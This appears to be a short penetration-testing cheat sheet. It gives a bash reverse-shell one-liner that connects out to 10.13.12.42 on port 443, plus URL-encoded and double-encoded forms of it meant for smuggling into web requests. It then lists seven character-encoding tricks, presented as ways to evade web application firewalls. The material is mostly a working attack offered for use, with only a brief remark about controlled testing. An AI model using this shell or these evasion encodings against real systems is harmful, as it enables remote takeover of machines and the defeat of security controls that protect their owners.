```
bash -i >& /dev/tcp/10.13.12.42/443 0>&1
```

Url encoding: (<https://www.urlencoder.org/>)
```
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.13.12.42%2F443%200%3E%261
bash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252F10.13.12.42%252F443%25200%253E%25261
```
### Here are some other encoding techniques that can be used to bypass web application firewalls and other security measures:
1. URL encoding - This involves replacing special characters with their encoded equivalents, using the % character followed by the ASCII code in hexadecimal format. For example, %3C represents the < character.

2. Double URL encoding - This involves encoding the already encoded characters again. For example, %3C becomes %253C.

3. Hexadecimal encoding - This involves representing characters using their ASCII codes in hexadecimal format. For example, the < character is represented as 3C.

4. Decimal encoding - This involves representing characters using their ASCII codes in decimal format. For example, the < character is represented as 60.

5. UTF-8 encoding - This involves representing characters using the UTF-8 character encoding scheme, which can represent any Unicode character. For example, the < character is represented as %3C in UTF-8 encoding.

6. JavaScript encoding - This involves using the escape() or encodeURI() functions in JavaScript to encode characters. For example, the < character is represented as %3C when using escape().

7. CSS encoding - This involves using the \ character followed by the ASCII code in hexadecimal format to represent characters in CSS. For example, \3C represents the < character.
### It's important to note that the effectiveness of these encoding techniques may depend on the specific WAF or security measures in place, and should be tested in a controlled environment before attempting to use them in a real-world scenario.

OCTAL AND CHARSET TOO